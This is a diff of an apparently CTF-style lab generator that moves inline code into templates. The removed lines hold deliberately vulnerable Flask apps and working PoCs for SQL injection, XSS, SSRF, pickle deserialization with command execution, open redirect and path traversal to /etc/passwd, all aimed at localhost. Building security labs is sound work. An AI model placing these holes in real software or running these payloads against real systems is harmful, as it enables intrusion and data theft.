@@ -49,6 +49,8 @@ except ModuleNotFoundError:  # pragma: no cover - fallback for older interpreter
     tomllib = None
 
 LOGGER = get_logger(__name__)
+ASSETS_ROOT = Path(__file__).resolve().parent / "assets"
+FALLBACK_TEMPLATES_ROOT = ASSETS_ROOT / "fallbacks"
 DEFAULT_POC_TEMPLATE = {
     # Prefer passing base-url explicitly so executor-resolved ports work even
     # when the generated PoC script uses a different default port.
@@ -904,6 +906,38 @@ class SynthesisEngine:
         if isinstance(poc_template.get("notes"), str) and poc_template.get("notes").strip():
             poc_block["notes"] = poc_template.get("notes")
 
+        app_content = self._render_fallback_asset(
+            "generic_reflect_app.py.tmpl",
+            {
+                "__PORT__": str(port),
+                "__REFLECT_PATH__": reflect_path,
+            },
+        )
+        poc_content = self._render_fallback_asset(
+            "generic_reflect_poc.py.tmpl",
+            {
+                "__PORT__": str(port),
+                "__SUCCESS_SIGNATURE__": repr(success_signature),
+                "__FLAG_TOKEN__": repr(flag_token),
+                "__DEFAULT_PAYLOAD__": repr(default_payload),
+                "__REFLECT_PATH_LITERAL__": repr(reflect_path),
+            },
+        )
+        dockerfile_content = self._render_fallback_asset(
+            "fallback_bundle_dockerfile.tmpl",
+            {
+                "__PORT__": str(port),
+                "__SERVICE_PATH__": "app.py",
+            },
+        )
+        readme_content = self._render_fallback_asset(
+            "fallback_bundle_readme.md.tmpl",
+            {
+                "__VULN_ID__": vuln_id,
+                "__PORT__": str(port),
+            },
+        )
+
         return {
             "intent": f"{vuln_id} fallback synthesis",
             "pattern_tags": self._fallback_pattern_tags(vuln_id),
@@ -912,14 +946,7 @@ class SynthesisEngine:
                     "path": "Dockerfile",
                     "role": "helper",
                     "description": "Build Python image for fallback bundle.",
-                    "content": (
-                        "FROM python:3.11-slim\n"
-                        "WORKDIR /app\n"
-                        "COPY . /app\n"
-                        "RUN pip install --no-cache-dir -r requirements.txt\n"
-                        f"EXPOSE {port}\n"
-                        "CMD [\"python\", \"app.py\"]\n"
-                    ),
+                    "content": dockerfile_content,
                 },
                 {
                     "path": "requirements.txt",
@@ -931,72 +958,19 @@ class SynthesisEngine:
                     "path": "app.py",
                     "role": "service_main",
                     "description": f"{stack} fallback vulnerable endpoint (reflect).",
-                    "content": (
-                        "from flask import Flask, request\n\n"
-                        "app = Flask(__name__)\n\n"
-                        "@app.get('/health')\n"
-                        "def health():\n"
-                        "    return {'ok': True}\n\n"
-                        f"@app.get('{reflect_path}')\n"
-                        "def reflect():\n"
-                        "    # Intentionally unsafe reflection: demonstrates a generic input-handling flaw.\n"
-                        "    value = request.args.get('q', '')\n"
-                        "    return f\"<p>{value}</p>\"  # no escaping\n\n"
-                        "if __name__ == '__main__':\n"
-                        f"    app.run(host='0.0.0.0', port={port})\n"
-                    ),
+                    "content": app_content,
                 },
                 {
                     "path": "poc.py",
                     "role": "poc_entry",
                     "description": "Fallback PoC that triggers reflect and prints the success marker.",
-                    "content": (
-                        "import argparse\n"
-                        "import sys\n"
-                        "from urllib.parse import quote\n"
-                        "from urllib.request import urlopen\n"
-                        "from urllib.error import URLError, HTTPError\n\n"
-                        f"SUCCESS_SIGNATURE = {success_signature!r}\n"
-                        f"FLAG_TOKEN = {flag_token!r}\n"
-                        f"DEFAULT_PAYLOAD = {default_payload!r}\n"
-                        f"PATH = {reflect_path!r}\n\n"
-                        "def exploit(base_url: str, payload: str) -> bool:\n"
-                        "    url = base_url.rstrip('/') + PATH + '?q=' + quote(payload)\n"
-                        "    try:\n"
-                        "        with urlopen(url, timeout=5) as resp:\n"
-                        "            body = resp.read().decode('utf-8', errors='ignore')\n"
-                        "    except (HTTPError, URLError) as exc:\n"
-                        "        print(f'[fallback] request failed: {exc}', file=sys.stderr)\n"
-                        "        return False\n"
-                        "    return payload in body\n\n"
-                        "def main() -> None:\n"
-                        "    parser = argparse.ArgumentParser(description='Fallback PoC')\n"
-                        f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
-                        "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)\n"
-                        "    args = parser.parse_args()\n"
-                        "    if exploit(args.base_url, args.payload):\n"
-                        "        print(SUCCESS_SIGNATURE)\n"
-                        "        if FLAG_TOKEN:\n"
-                        "            print(FLAG_TOKEN)\n"
-                        "        sys.exit(0)\n"
-                        "    print('[fallback] exploit did not succeed', file=sys.stderr)\n"
-                        "    sys.exit(1)\n\n"
-                        "if __name__ == '__main__':\n"
-                        "    main()\n"
-                    ),
+                    "content": poc_content,
                 },
                 {
                     "path": "README.md",
                     "role": "helper",
                     "description": "Quickstart instructions.",
-                    "content": (
-                        f"# {vuln_id} fallback bundle\n"
-                        "```bash\n"
-                        "docker build -t fallback-bundle .\n"
-                        f"docker run -p {port}:{port} fallback-bundle\n"
-                        f"python poc.py --base-url http://127.0.0.1:{port}\n"
-                        "```\n"
-                    ),
+                    "content": readme_content,
                 },
             ],
             "deps": ["Flask==3.0.0"],
@@ -1093,19 +1067,26 @@ class SynthesisEngine:
             for line in requirements_content.splitlines()
             if isinstance(line, str) and line.strip() and not line.strip().startswith("#")
         ]
+        dockerfile_content = self._render_fallback_asset(
+            "fallback_bundle_dockerfile.tmpl",
+            {
+                "__PORT__": str(port),
+                "__SERVICE_PATH__": service_path,
+            },
+        )
+        readme_content = self._render_fallback_asset(
+            "fallback_bundle_readme.md.tmpl",
+            {
+                "__VULN_ID__": vuln_id,
+                "__PORT__": str(port),
+            },
+        )
         files: List[Dict[str, Any]] = [
             {
                 "path": "Dockerfile",
                 "role": "helper",
                 "description": "Build Python image for fallback bundle.",
-                "content": (
-                    "FROM python:3.11-slim\n"
-                    "WORKDIR /app\n"
-                    "COPY . /app\n"
-                    "RUN pip install --no-cache-dir -r requirements.txt\n"
-                    f"EXPOSE {port}\n"
-                    f"CMD [\"python\", \"{service_path}\"]\n"
-                ),
+                "content": dockerfile_content,
             },
             {
                 "path": "requirements.txt",
@@ -1134,14 +1115,7 @@ class SynthesisEngine:
                 "path": "README.md",
                 "role": "helper",
                 "description": "Quickstart instructions.",
-                "content": (
-                    f"# {vuln_id} fallback bundle\n"
-                    "```bash\n"
-                    "docker build -t fallback-bundle .\n"
-                    f"docker run -p {port}:{port} fallback-bundle\n"
-                    f"python poc.py --base-url http://127.0.0.1:{port}\n"
-                    "```\n"
-                ),
+                "content": readme_content,
             }
         )
         poc_block: Dict[str, Any] = {
@@ -1179,84 +1153,19 @@ class SynthesisEngine:
         success_signature: str,
         flag_token: str,
     ) -> Dict[str, Any]:
-        app_content = (
-            "from pathlib import Path\n"
-            "import sqlite3\n"
-            "from flask import Flask, jsonify, request\n\n"
-            "app = Flask(__name__)\n"
-            "DB_PATH = Path('/tmp/sqli-demo.db')\n"
-            "SCHEMA_SQL = '''\n"
-            "CREATE TABLE IF NOT EXISTS users (\n"
-            "    id INTEGER PRIMARY KEY AUTOINCREMENT,\n"
-            "    username TEXT,\n"
-            "    password TEXT\n"
-            ");\n"
-            "DELETE FROM users;\n"
-            "INSERT INTO users (username, password) VALUES ('admin', 'secret');\n"
-            "INSERT INTO users (username, password) VALUES ('guest', 'guest');\n"
-            "'''\n\n"
-            "def init_db() -> None:\n"
-            "    conn = sqlite3.connect(DB_PATH)\n"
-            "    conn.executescript(SCHEMA_SQL)\n"
-            "    conn.commit()\n"
-            "    conn.close()\n\n"
-            "@app.get('/health')\n"
-            "def health():\n"
-            "    return {'ok': True}\n\n"
-            "@app.get('/login')\n"
-            "def login():\n"
-            "    query = (\n"
-            "        \"SELECT id, username FROM users \"\n"
-            "        \"WHERE username = '\" + request.args.get('username', '') + \"' \"\n"
-            "        \"AND password = '\" + request.args.get('password', '') + \"'\"\n"
-            "    )\n"
-            "    conn = sqlite3.connect(DB_PATH)\n"
-            "    conn.row_factory = sqlite3.Row\n"
-            "    cur = conn.cursor()\n"
-            "    rows = cur.execute(query).fetchall()\n"
-            "    conn.close()\n"
-            "    return jsonify({'match': bool(rows), 'rows': [dict(row) for row in rows], 'query': query})\n\n"
-            "if __name__ == '__main__':\n"
-            "    init_db()\n"
-            f"    app.run(host='0.0.0.0', port={port})\n"
+        app_content = self._render_fallback_asset(
+            "sqli_family_aware_app.py.tmpl",
+            {
+                "__PORT__": str(port),
+            },
         )
-        poc_content = (
-            "import argparse\n"
-            "import json\n"
-            "import sys\n"
-            "from urllib.error import HTTPError, URLError\n"
-            "from urllib.parse import urlencode\n"
-            "from urllib.request import urlopen\n\n"
-            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
-            f"FLAG_TOKEN = {flag_token!r}\n"
-            "DEFAULT_PARAMS = {'username': \"admin' OR '1'='1\", 'password': 'irrelevant'}\n\n"
-            "def exploit(base_url: str) -> bool:\n"
-            "    url = base_url.rstrip('/') + '/login?' + urlencode(DEFAULT_PARAMS)\n"
-            "    try:\n"
-            "        with urlopen(url, timeout=5) as resp:\n"
-            "            body = resp.read().decode('utf-8', errors='ignore')\n"
-            "    except (HTTPError, URLError) as exc:\n"
-            "        print(f'[sqli-fallback] request failed: {exc}', file=sys.stderr)\n"
-            "        return False\n"
-            "    try:\n"
-            "        payload = json.loads(body)\n"
-            "    except json.JSONDecodeError:\n"
-            "        return False\n"
-            "    rows = payload.get('rows') or []\n"
-            "    return any(isinstance(row, dict) and row.get('username') == 'admin' for row in rows)\n\n"
-            "def main() -> None:\n"
-            "    parser = argparse.ArgumentParser(description='SQLi fallback PoC')\n"
-            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
-            "    args = parser.parse_args()\n"
-            "    if exploit(args.base_url):\n"
-            "        print(SUCCESS_SIGNATURE)\n"
-            "        if FLAG_TOKEN:\n"
-            "            print(FLAG_TOKEN)\n"
-            "        raise SystemExit(0)\n"
-            "    print('[sqli-fallback] exploit did not succeed', file=sys.stderr)\n"
-            "    raise SystemExit(1)\n\n"
-            "if __name__ == '__main__':\n"
-            "    main()\n"
+        poc_content = self._render_fallback_asset(
+            "sqli_family_aware_poc.py.tmpl",
+            {
+                "__PORT__": str(port),
+                "__SUCCESS_SIGNATURE__": repr(success_signature),
+                "__FLAG_TOKEN__": repr(flag_token),
+            },
         )
         return self._fallback_manifest_from_parts(
             vuln_id=vuln_id,
@@ -1270,6 +1179,14 @@ class SynthesisEngine:
             poc_content=poc_content,
         )
 
+    def _render_fallback_asset(self, name: str, replacements: Dict[str, str]) -> str:
+        path = FALLBACK_TEMPLATES_ROOT / name
+        text = path.read_text(encoding="utf-8")
+        rendered = text
+        for key, value in replacements.items():
+            rendered = rendered.replace(key, value)
+        return rendered
+
     def _fallback_manifest_csrf(
         self,
         *,
@@ -1281,69 +1198,19 @@ class SynthesisEngine:
         success_signature: str,
         flag_token: str,
     ) -> Dict[str, Any]:
-        app_content = (
-            "from flask import Flask, jsonify, request, session\n\n"
-            "app = Flask(__name__)\n"
-            "app.secret_key = 'csrf-fallback-secret'\n"
-            "BALANCES = {'victim': 1000, 'attacker': 0}\n\n"
-            "@app.get('/health')\n"
-            "def health():\n"
-            "    return {'ok': True}\n\n"
-            "@app.get('/login')\n"
-            "def login():\n"
-            "    user = request.args.get('user', 'victim')\n"
-            "    session['user'] = user\n"
-            "    BALANCES.setdefault(user, 1000)\n"
-            "    return jsonify({'logged_in_as': user})\n\n"
-            "@app.post('/transfer')\n"
-            "def transfer():\n"
-            "    user = session.get('user', 'victim')\n"
-            "    recipient = request.form.get('recipient', 'attacker')\n"
-            "    amount = int(request.form.get('amount', '250'))\n"
-            "    BALANCES[recipient] = BALANCES.get(recipient, 0) + amount\n"
-            "    BALANCES[user] = BALANCES.get(user, 1000) - amount\n"
-            "    return jsonify({'ok': True, 'by': user, 'recipient': recipient, 'amount': amount, 'recipient_balance': BALANCES[recipient]})\n\n"
-            "if __name__ == '__main__':\n"
-            f"    app.run(host='0.0.0.0', port={port})\n"
+        app_content = self._render_fallback_asset(
+            "csrf_family_aware_app.py.tmpl",
+            {
+                "__PORT__": str(port),
+            },
         )
-        poc_content = (
-            "import argparse\n"
-            "import http.cookiejar\n"
-            "import json\n"
-            "import sys\n"
-            "from urllib.error import HTTPError, URLError\n"
-            "from urllib.parse import urlencode\n"
-            "from urllib.request import HTTPCookieProcessor, Request, build_opener\n\n"
-            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
-            f"FLAG_TOKEN = {flag_token!r}\n\n"
-            "def exploit(base_url: str) -> bool:\n"
-            "    cookie_jar = http.cookiejar.CookieJar()\n"
-            "    opener = build_opener(HTTPCookieProcessor(cookie_jar))\n"
-            "    try:\n"
-            "        with opener.open(base_url.rstrip('/') + '/login?user=victim', timeout=5) as resp:\n"
-            "            resp.read()\n"
-            "        body = urlencode({'recipient': 'attacker', 'amount': '250'}).encode('utf-8')\n"
-            "        req = Request(base_url.rstrip('/') + '/transfer', data=body, method='POST')\n"
-            "        req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n"
-            "        with opener.open(req, timeout=5) as resp:\n"
-            "            payload = json.loads(resp.read().decode('utf-8', errors='ignore'))\n"
-            "    except (HTTPError, URLError, json.JSONDecodeError) as exc:\n"
-            "        print(f'[csrf-fallback] request failed: {exc}', file=sys.stderr)\n"
-            "        return False\n"
-            "    return payload.get('ok') is True and str(payload.get('recipient')) == 'attacker' and str(payload.get('amount')) == '250'\n\n"
-            "def main() -> None:\n"
-            "    parser = argparse.ArgumentParser(description='CSRF fallback PoC')\n"
-            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
-            "    args = parser.parse_args()\n"
-            "    if exploit(args.base_url):\n"
-            "        print(SUCCESS_SIGNATURE)\n"
-            "        if FLAG_TOKEN:\n"
-            "            print(FLAG_TOKEN)\n"
-            "        raise SystemExit(0)\n"
-            "    print('[csrf-fallback] exploit did not succeed', file=sys.stderr)\n"
-            "    raise SystemExit(1)\n\n"
-            "if __name__ == '__main__':\n"
-            "    main()\n"
+        poc_content = self._render_fallback_asset(
+            "csrf_family_aware_poc.py.tmpl",
+            {
+                "__PORT__": str(port),
+                "__SUCCESS_SIGNATURE__": repr(success_signature),
+                "__FLAG_TOKEN__": repr(flag_token),
+            },
         )
         return self._fallback_manifest_from_parts(
             vuln_id=vuln_id,
@@ -1368,19 +1235,19 @@ class SynthesisEngine:
         success_signature: str,
         flag_token: str,
     ) -> Dict[str, Any]:
-        app_content = (
-            "from flask import Flask, render_template_string, request\n\n"
-            "app = Flask(__name__)\n\n"
-            "@app.get('/health')\n"
-            "def health():\n"
-            "    return {'ok': True}\n\n"
-            "@app.get('/greet')\n"
-            "def greet():\n"
-            "    name = request.args.get('name', 'Guest')\n"
-            "    template = '<h1>Hello ' + name + '</h1>'\n"
-            "    return render_template_string(template)\n\n"
-            "if __name__ == '__main__':\n"
-            f"    app.run(host='0.0.0.0', port={port})\n"
+        app_content = self._render_fallback_asset(
+            "template_injection_family_aware_app.py.tmpl",
+            {
+                "__PORT__": str(port),
+            },
+        )
+        poc_content = self._render_fallback_asset(
+            "template_injection_family_aware_poc.py.tmpl",
+            {
+                "__PORT__": str(port),
+                "__SUCCESS_SIGNATURE__": repr(success_signature),
+                "__FLAG_TOKEN__": repr(flag_token),
+            },
         )
         return self._fallback_manifest_from_parts(
             vuln_id=normalized_vuln or vuln_id,
@@ -1391,7 +1258,7 @@ class SynthesisEngine:
             flag_token=flag_token,
             requirements_content="Flask==3.0.0\nrequests==2.31.0\n",
             app_content=app_content,
-            poc_content=None,
+            poc_content=poc_content,
         )
 
     def _fallback_manifest_xss(
@@ -1405,53 +1272,19 @@ class SynthesisEngine:
         success_signature: str,
         flag_token: str,
     ) -> Dict[str, Any]:
-        app_content = (
-            "from flask import Flask, render_template_string, request\n\n"
-            "app = Flask(__name__)\n\n"
-            "@app.get('/health')\n"
-            "def health():\n"
-            "    return {'ok': True}\n\n"
-            "@app.get('/search')\n"
-            "def search():\n"
-            "    # Reflected cross-site scripting: unescaped reflection of <script> payloads into a template response.\n"
-            "    name = request.args.get('name', 'Guest')\n"
-            "    template = \"<div class='result'>\" + name + \"</div>\"\n"
-            "    return render_template_string(template)\n\n"
-            "if __name__ == '__main__':\n"
-            f"    app.run(host='0.0.0.0', port={port})\n"
+        app_content = self._render_fallback_asset(
+            "xss_family_aware_app.py.tmpl",
+            {
+                "__PORT__": str(port),
+            },
         )
-        poc_content = (
-            "import argparse\n"
-            "import sys\n"
-            "from urllib.error import HTTPError, URLError\n"
-            "from urllib.parse import quote\n"
-            "from urllib.request import urlopen\n\n"
-            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
-            f"FLAG_TOKEN = {flag_token!r}\n"
-            "DEFAULT_PAYLOAD = '<script>alert(1)</script>'\n\n"
-            "def exploit(base_url: str, payload: str) -> bool:\n"
-            "    url = base_url.rstrip('/') + '/search?name=' + quote(payload)\n"
-            "    try:\n"
-            "        with urlopen(url, timeout=5) as resp:\n"
-            "            body = resp.read().decode('utf-8', errors='ignore')\n"
-            "    except (HTTPError, URLError) as exc:\n"
-            "        print(f'[xss-fallback] request failed: {exc}', file=sys.stderr)\n"
-            "        return False\n"
-            "    return payload in body\n\n"
-            "def main() -> None:\n"
-            "    parser = argparse.ArgumentParser(description='XSS fallback PoC')\n"
-            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
-            "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)\n"
-            "    args = parser.parse_args()\n"
-            "    if exploit(args.base_url, args.payload):\n"
-            "        print(SUCCESS_SIGNATURE)\n"
-            "        if FLAG_TOKEN:\n"
-            "            print(FLAG_TOKEN)\n"
-            "        raise SystemExit(0)\n"
-            "    print('[xss-fallback] exploit did not succeed', file=sys.stderr)\n"
-            "    raise SystemExit(1)\n\n"
-            "if __name__ == '__main__':\n"
-            "    main()\n"
+        poc_content = self._render_fallback_asset(
+            "xss_family_aware_poc.py.tmpl",
+            {
+                "__PORT__": str(port),
+                "__SUCCESS_SIGNATURE__": repr(success_signature),
+                "__FLAG_TOKEN__": repr(flag_token),
+            },
         )
         return self._fallback_manifest_from_parts(
             vuln_id=normalized_vuln or vuln_id,
@@ -1477,61 +1310,20 @@ class SynthesisEngine:
         flag_token: str,
     ) -> Dict[str, Any]:
         effective_flag = flag_token or "FLAG{SSRF_OK}"
-        app_content = (
-            "import requests\n"
-            "from flask import Flask, jsonify, request\n\n"
-            "app = Flask(__name__)\n\n"
-            "@app.get('/health')\n"
-            "def health():\n"
-            "    return {'ok': True}\n\n"
-            "@app.get('/metadata')\n"
-            "def metadata():\n"
-            f"    return jsonify({{'flag': {effective_flag!r}, 'service': 'metadata'}})\n\n"
-            "@app.get('/fetch')\n"
-            "def fetch():\n"
-            "    # server-side request forgery: user-controlled url reaches requests.get\n"
-            "    target_url = request.args.get('url', 'http://127.0.0.1:8000/metadata')\n"
-            "    resp = requests.get(target_url, timeout=2)\n"
-            "    return resp.text, resp.status_code, {'Content-Type': resp.headers.get('Content-Type', 'text/plain')}\n\n"
-            "if __name__ == '__main__':\n"
-            f"    app.run(host='0.0.0.0', port={port})\n"
+        app_content = self._render_fallback_asset(
+            "ssrf_family_aware_app.py.tmpl",
+            {
+                "__PORT__": str(port),
+                "__FLAG_TOKEN__": repr(effective_flag),
+            },
         )
-        poc_content = (
-            "import argparse\n"
-            "import json\n"
-            "import sys\n"
-            "from urllib.error import HTTPError, URLError\n"
-            "from urllib.parse import quote\n"
-            "from urllib.request import urlopen\n\n"
-            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
-            f"FLAG_TOKEN = {effective_flag!r}\n"
-            "DEFAULT_TARGET = 'http://127.0.0.1:8000/metadata'\n\n"
-            "def exploit(base_url: str, target: str) -> bool:\n"
-            "    url = base_url.rstrip('/') + '/fetch?url=' + quote(target, safe=':/?=&')\n"
-            "    try:\n"
-            "        with urlopen(url, timeout=5) as resp:\n"
-            "            body = resp.read().decode('utf-8', errors='ignore')\n"
-            "    except (HTTPError, URLError) as exc:\n"
-            "        print(f'[ssrf-fallback] request failed: {exc}', file=sys.stderr)\n"
-            "        return False\n"
-            "    try:\n"
-            "        payload = json.loads(body)\n"
-            "    except json.JSONDecodeError:\n"
-            "        return False\n"
-            "    return str(payload.get('flag')) == FLAG_TOKEN\n\n"
-            "def main() -> None:\n"
-            "    parser = argparse.ArgumentParser(description='SSRF fallback PoC')\n"
-            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
-            "    parser.add_argument('--payload', default=DEFAULT_TARGET)\n"
-            "    args = parser.parse_args()\n"
-            "    if exploit(args.base_url, args.payload):\n"
-            "        print(SUCCESS_SIGNATURE)\n"
-            "        print(FLAG_TOKEN)\n"
-            "        raise SystemExit(0)\n"
-            "    print('[ssrf-fallback] exploit did not succeed', file=sys.stderr)\n"
-            "    raise SystemExit(1)\n\n"
-            "if __name__ == '__main__':\n"
-            "    main()\n"
+        poc_content = self._render_fallback_asset(
+            "ssrf_family_aware_poc.py.tmpl",
+            {
+                "__PORT__": str(port),
+                "__SUCCESS_SIGNATURE__": repr(success_signature),
+                "__FLAG_TOKEN__": repr(effective_flag),
+            },
         )
         return self._fallback_manifest_from_parts(
             vuln_id=normalized_vuln or vuln_id,
@@ -1557,69 +1349,20 @@ class SynthesisEngine:
         flag_token: str,
     ) -> Dict[str, Any]:
         effective_flag = flag_token or "FLAG{DESER_OK}"
-        app_content = (
-            "from pathlib import Path\n"
-            "import pickle\n"
-            "from flask import Flask, jsonify, request\n\n"
-            "app = Flask(__name__)\n"
-            "FLAG_PATH = Path('/tmp/deser-flag.txt')\n"
-            f"FLAG_VALUE = {effective_flag!r}\n\n"
-            "@app.get('/health')\n"
-            "def health():\n"
-            "    return {'ok': True}\n\n"
-            "@app.post('/deserialize')\n"
-            "def deserialize_payload():\n"
-            "    # insecure deserialization of attacker-controlled serialized payload.\n"
-            "    payload = request.get_data()\n"
-            "    result = pickle.loads(payload)\n"
-            "    return jsonify({'result': str(result)})\n\n"
-            "def init_runtime_state() -> None:\n"
-            "    FLAG_PATH.write_text(FLAG_VALUE, encoding='utf-8')\n\n"
-            "if __name__ == '__main__':\n"
-            "    init_runtime_state()\n"
-            f"    app.run(host='0.0.0.0', port={port})\n"
+        app_content = self._render_fallback_asset(
+            "deserialization_family_aware_app.py.tmpl",
+            {
+                "__PORT__": str(port),
+                "__FLAG_TOKEN__": repr(effective_flag),
+            },
         )
-        poc_content = (
-            "import argparse\n"
-            "import json\n"
-            "import pickle\n"
-            "import sys\n"
-            "from urllib.error import HTTPError, URLError\n"
-            "from urllib.request import Request, urlopen\n\n"
-            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
-            f"FLAG_TOKEN = {effective_flag!r}\n\n"
-            "class Exploit:\n"
-            "    def __reduce__(self):\n"
-            "        import subprocess\n"
-            "        return (subprocess.getoutput, ('cat /tmp/deser-flag.txt',))\n\n"
-            "def exploit(base_url: str) -> bool:\n"
-            "    target = base_url.rstrip('/') + '/deserialize'\n"
-            "    payload = pickle.dumps(Exploit(), protocol=pickle.HIGHEST_PROTOCOL)\n"
-            "    request_obj = Request(target, data=payload, method='POST')\n"
-            "    request_obj.add_header('Content-Type', 'application/octet-stream')\n"
-            "    try:\n"
-            "        with urlopen(request_obj, timeout=5) as resp:\n"
-            "            body = resp.read().decode('utf-8', errors='ignore')\n"
-            "    except (HTTPError, URLError) as exc:\n"
-            "        print(f'[deser-fallback] request failed: {exc}', file=sys.stderr)\n"
-            "        return False\n"
-            "    try:\n"
-            "        payload = json.loads(body)\n"
-            "    except json.JSONDecodeError:\n"
-            "        return False\n"
-            "    return str(payload.get('result')) == FLAG_TOKEN\n\n"
-            "def main() -> None:\n"
-            "    parser = argparse.ArgumentParser(description='Deserialization fallback PoC')\n"
-            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
-            "    args = parser.parse_args()\n"
-            "    if exploit(args.base_url):\n"
-            "        print(SUCCESS_SIGNATURE)\n"
-            "        print(FLAG_TOKEN)\n"
-            "        raise SystemExit(0)\n"
-            "    print('[deser-fallback] exploit did not succeed', file=sys.stderr)\n"
-            "    raise SystemExit(1)\n\n"
-            "if __name__ == '__main__':\n"
-            "    main()\n"
+        poc_content = self._render_fallback_asset(
+            "deserialization_family_aware_poc.py.tmpl",
+            {
+                "__PORT__": str(port),
+                "__SUCCESS_SIGNATURE__": repr(success_signature),
+                "__FLAG_TOKEN__": repr(effective_flag),
+            },
         )
         return self._fallback_manifest_from_parts(
             vuln_id=normalized_vuln or vuln_id,
@@ -1644,50 +1387,19 @@ class SynthesisEngine:
         success_signature: str,
         flag_token: str,
     ) -> Dict[str, Any]:
-        app_content = (
-            "from flask import Flask, redirect, request\n\n"
-            "app = Flask(__name__)\n\n"
-            "@app.get('/health')\n"
-            "def health():\n"
-            "    return {'ok': True}\n\n"
-            "@app.get('/go')\n"
-            "def go():\n"
-            "    # Open redirect via unvalidated redirect target supplied by the next parameter.\n"
-            "    next_url = request.args.get('next', 'https://example.com')\n"
-            "    return redirect(next_url, code=302)\n\n"
-            "if __name__ == '__main__':\n"
-            f"    app.run(host='0.0.0.0', port={port})\n"
+        app_content = self._render_fallback_asset(
+            "open_redirect_family_aware_app.py.tmpl",
+            {
+                "__PORT__": str(port),
+            },
         )
-        poc_content = (
-            "import argparse\n"
-            "import sys\n"
-            "import requests\n\n"
-            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
-            f"FLAG_TOKEN = {flag_token!r}\n"
-            "DEFAULT_TARGET = 'https://evil.example/landing'\n\n"
-            "def exploit(base_url: str, target: str) -> bool:\n"
-            "    url = base_url.rstrip('/') + '/go'\n"
-            "    try:\n"
-            "        resp = requests.get(url, params={'next': target}, timeout=5, allow_redirects=False)\n"
-            "    except requests.RequestException as exc:\n"
-            "        print(f'[open-redirect-fallback] request failed: {exc}', file=sys.stderr)\n"
-            "        return False\n"
-            "    location = resp.headers.get('Location', '')\n"
-            "    return resp.status_code in {301, 302, 303, 307, 308} and location == target\n\n"
-            "def main() -> None:\n"
-            "    parser = argparse.ArgumentParser(description='Open Redirect fallback PoC')\n"
-            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
-            "    parser.add_argument('--payload', default=DEFAULT_TARGET)\n"
-            "    args = parser.parse_args()\n"
-            "    if exploit(args.base_url, args.payload):\n"
-            "        print(SUCCESS_SIGNATURE)\n"
-            "        if FLAG_TOKEN:\n"
-            "            print(FLAG_TOKEN)\n"
-            "        raise SystemExit(0)\n"
-            "    print('[open-redirect-fallback] exploit did not succeed', file=sys.stderr)\n"
-            "    raise SystemExit(1)\n\n"
-            "if __name__ == '__main__':\n"
-            "    main()\n"
+        poc_content = self._render_fallback_asset(
+            "open_redirect_family_aware_poc.py.tmpl",
+            {
+                "__PORT__": str(port),
+                "__SUCCESS_SIGNATURE__": repr(success_signature),
+                "__FLAG_TOKEN__": repr(flag_token),
+            },
         )
         return self._fallback_manifest_from_parts(
             vuln_id=vuln_id,
@@ -1712,57 +1424,19 @@ class SynthesisEngine:
         success_signature: str,
         flag_token: str,
     ) -> Dict[str, Any]:
-        app_content = (
-            "import os\n"
-            "from pathlib import Path\n"
-            "from flask import Flask, request\n\n"
-            "app = Flask(__name__)\n"
-            "BASE_DIR = Path('/tmp/path-demo')\n"
-            "BASE_DIR.mkdir(parents=True, exist_ok=True)\n"
-            "(BASE_DIR / 'note.txt').write_text('safe-note', encoding='utf-8')\n\n"
-            "@app.get('/health')\n"
-            "def health():\n"
-            "    return {'ok': True}\n\n"
-            "@app.get('/download')\n"
-            "def download():\n"
-            "    path = request.args.get('path', 'note.txt')\n"
-            "    target = os.path.join(str(BASE_DIR), path)\n"
-            "    with open(target, 'r', encoding='utf-8', errors='ignore') as handle:\n"
-            "        return handle.read()\n\n"
-            "if __name__ == '__main__':\n"
-            f"    app.run(host='0.0.0.0', port={port})\n"
+        app_content = self._render_fallback_asset(
+            "path_traversal_family_aware_app.py.tmpl",
+            {
+                "__PORT__": str(port),
+            },
         )
-        poc_content = (
-            "import argparse\n"
-            "import sys\n"
-            "from urllib.error import HTTPError, URLError\n"
-            "from urllib.parse import quote\n"
-            "from urllib.request import urlopen\n\n"
-            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
-            f"FLAG_TOKEN = {flag_token!r}\n"
-            "DEFAULT_PATH = '../../../../etc/passwd'\n\n"
-            "def exploit(base_url: str) -> bool:\n"
-            "    target = base_url.rstrip('/') + '/download?path=' + quote(DEFAULT_PATH)\n"
-            "    try:\n"
-            "        with urlopen(target, timeout=5) as resp:\n"
-            "            body = resp.read().decode('utf-8', errors='ignore')\n"
-            "    except (HTTPError, URLError) as exc:\n"
-            "        print(f'[path-fallback] request failed: {exc}', file=sys.stderr)\n"
-            "        return False\n"
-            "    return 'root:' in body or 'localhost' in body\n\n"
-            "def main() -> None:\n"
-            "    parser = argparse.ArgumentParser(description='Path traversal fallback PoC')\n"
-            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
-            "    args = parser.parse_args()\n"
-            "    if exploit(args.base_url):\n"
-            "        print(SUCCESS_SIGNATURE)\n"
-            "        if FLAG_TOKEN:\n"
-            "            print(FLAG_TOKEN)\n"
-            "        raise SystemExit(0)\n"
-            "    print('[path-fallback] exploit did not succeed', file=sys.stderr)\n"
-            "    raise SystemExit(1)\n\n"
-            "if __name__ == '__main__':\n"
-            "    main()\n"
+        poc_content = self._render_fallback_asset(
+            "path_traversal_family_aware_poc.py.tmpl",
+            {
+                "__PORT__": str(port),
+                "__SUCCESS_SIGNATURE__": repr(success_signature),
+                "__FLAG_TOKEN__": repr(flag_token),
+            },
         )
         return self._fallback_manifest_from_parts(
             vuln_id=normalized_vuln or vuln_id,
